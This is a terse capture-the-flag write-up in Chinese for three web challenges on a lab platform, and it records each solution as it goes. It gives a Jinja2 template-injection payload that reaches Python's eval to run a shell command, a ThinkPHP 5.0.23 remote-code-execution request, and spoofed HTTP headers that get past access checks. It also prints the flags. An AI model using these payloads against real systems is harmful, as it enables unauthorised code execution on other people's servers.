Web

## fake google

> 知识点：SSTI

> 题解

1. 根据源代码注释提示，SSTI模板注入
2. 注入

```
{% for c in [].__class__.__base__.__subclasses__() %}
{%if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}
{%endif%}
{% endfor %}
```

## old-hack

> 知识点：ThinkPHP5.0.23 远程RCE

> 题解

```
POST http://244a0b0a-7187-4c12-b732-c4c75557924b.node3.buuoj.cn/?s=captcha

{
    "_method": "__construct",
    "filter[]": "system",
    "server[REQUEST_METHOD]": "cat /flag"
}
```

> flag{5c1565e5-6062-4416-b15a-75d3bc704bc6}

## 假猪套天下第一

> 题解

```
GET /L0g1n.php
Cookie: PHPSESSID=29l41t2qh0buaagirh7tlqrsu6; time=253400544000
Client-IP: 127.0.0.1
User-Agent: Commodore 64
from: root@gem-love.com
via: y1ng.vip
```

> flag{d68b92d3-635a-492d-9411-8c603ba1561c}